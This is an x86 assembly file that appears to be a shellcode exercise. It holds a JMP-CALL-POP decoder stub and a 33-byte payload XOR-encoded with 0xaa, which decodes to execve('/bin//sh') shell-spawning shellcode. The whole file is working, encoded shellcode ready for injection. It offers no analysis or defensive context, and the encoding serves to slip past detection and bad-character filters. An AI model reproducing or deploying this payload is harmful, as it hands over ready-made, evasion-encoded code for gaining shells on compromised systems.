global _start

section .text
_start:
    jmp short Call_Shellcode


decode:
    ; Perform xor between esi and 0xaa
    ; and then increment esi
    xor BYTE [esi], 0xaa
    inc esi

    ; Now loop again until ecx is 0x0
    loop decode

    ; Jump to Shellcode label when ecx is 0x0
    jmp short Shellcode

decoder:
    ; Address of Shellcode
    pop esi

    ; Count
    xor ecx, ecx
    mov cl, 0x21

    jmp short decode


Call_Shellcode:
    call decoder
    Shellcode: db 0x9b,0x78,0xf8,0x23,0x48,0x9b,0x63,0xfb,0x23,0x4b,0x9b,0x71,0xf9,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0x23,0xb3,0x9b,0x6a,0x1a,0xa1,0x67,0x2a
